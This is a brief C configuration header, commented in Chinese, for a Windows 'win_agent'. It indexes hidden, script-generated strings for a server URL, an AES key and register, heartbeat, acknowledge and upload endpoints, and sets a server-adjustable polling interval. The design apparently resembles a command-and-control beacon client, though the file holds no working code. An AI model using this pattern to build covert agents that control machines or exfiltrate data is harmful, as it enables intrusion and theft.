/*
 * config.h — 编译时配置
 * 修改后运行 gen_blobs.py 重新生成 blobs.h，再编译。
 */
#pragma once

/* blob 索引，与 blobs.h 中 BLOBS[] 顺序一致 */
#define BLOB_BASE_URL   0
#define BLOB_AES_KEY    1
#define BLOB_EP_REG     2
#define BLOB_EP_BEAT    3
#define BLOB_EP_ACK     4
#define BLOB_EP_UPLOAD  5
#define BLOB_VERSION    6
#define NBLOBS          7

/* 默认轮询间隔（秒），服务器下发 config 后动态覆盖 */
#define DEFAULT_POLL_SEC   60
#define MIN_POLL_SEC       5

/* 软件标识（software_type），用于分组 */
#define SOFTWARE_TYPE  "win_agent"
